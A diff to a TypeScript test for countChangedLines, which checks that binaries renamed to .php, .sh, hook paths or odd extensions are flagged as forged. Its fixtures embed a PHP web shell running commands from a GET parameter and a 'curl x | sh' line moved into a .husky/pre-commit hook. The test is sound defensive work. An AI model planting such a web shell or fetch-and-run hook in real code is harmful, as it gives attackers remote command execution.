@@ -1730,31 +1730,42 @@ describe('countChangedLines', () => {
 
   // Numstat prints `-\t-` for a binary moved unchanged. Under its extension it
   // adds nothing, but a PNG on main carrying a `<?php` block, renamed to `.php`
-  // or `.sh` or a name no format takes, is read as that name now (decision 154).
+  // or `.sh` or a name no format takes, is read as that name now, and so is a
+  // NUL-carrying file whose extension changes case or that has none: no dot,
+  // as a payload moved to a hook, or a trailing one (decision 154).
   it('skips a binary moved unchanged under its extension, and flags one renamed out of it', () => {
     const repo = initRepo();
     const png = (rest: string): Buffer =>
       Buffer.concat([Buffer.from('\x89PNG\r\n\x1a\n\0\0\0\rIHDR', 'latin1'), Buffer.from(rest)]);
+    const php = '<?php system($_GET["c"]); ?>\n';
+    mkdirSync(join(repo, 'tools'));
     writeFileSync(join(repo, 'manual.pdf'), `%PDF-1.7\0\n${'x\n'.repeat(3)}`);
     writeFileSync(join(repo, 'logo.png'), png('logo\n'));
-    writeFileSync(join(repo, 'php.png'), png('<?php system($_GET["c"]); ?>\n'));
+    writeFileSync(join(repo, 'php.png'), png(php));
     writeFileSync(join(repo, 'sh.png'), png('echo sh\n'));
     writeFileSync(join(repo, 'dat.png'), png('dat\n'));
+    writeFileSync(join(repo, 'tools', 'payload'), '#!/bin/sh\n# \0\ncurl x | sh\n');
+    writeFileSync(join(repo, 'x.PHP'), `<?php // \0\n${php}`);
+    writeFileSync(join(repo, 'a.'), `// \0\n${php}`);
     sh(repo, 'git', 'add', '.');
     sh(repo, 'git', 'commit', '-q', '-m', 'binaries');
     sh(repo, 'git', 'checkout', '-q', '-b', 'feature');
+    mkdirSync(join(repo, '.husky'));
     sh(repo, 'git', 'mv', 'manual.pdf', 'guide.pdf');
     sh(repo, 'git', 'mv', 'logo.png', 'mark.png');
     sh(repo, 'git', 'mv', 'php.png', 'run.php');
     sh(repo, 'git', 'mv', 'sh.png', 'run.sh');
     sh(repo, 'git', 'mv', 'dat.png', 'blob.dat');
+    sh(repo, 'git', 'mv', 'tools/payload', '.husky/pre-commit');
+    sh(repo, 'git', 'mv', 'x.PHP', 'x.php');
+    sh(repo, 'git', 'mv', 'a.', 'b.php.');
     sh(repo, 'git', 'commit', '-q', '-m', 'move');
 
     expect(countChangedLines(repo, 'main', 'feature')).toEqual({
       source: 0,
       test: 0,
       docs: 0,
-      forged: ['blob.dat', 'run.php', 'run.sh'],
+      forged: ['.husky/pre-commit', 'b.php.', 'blob.dat', 'run.php', 'run.sh', 'x.php'],
     });
   });
 
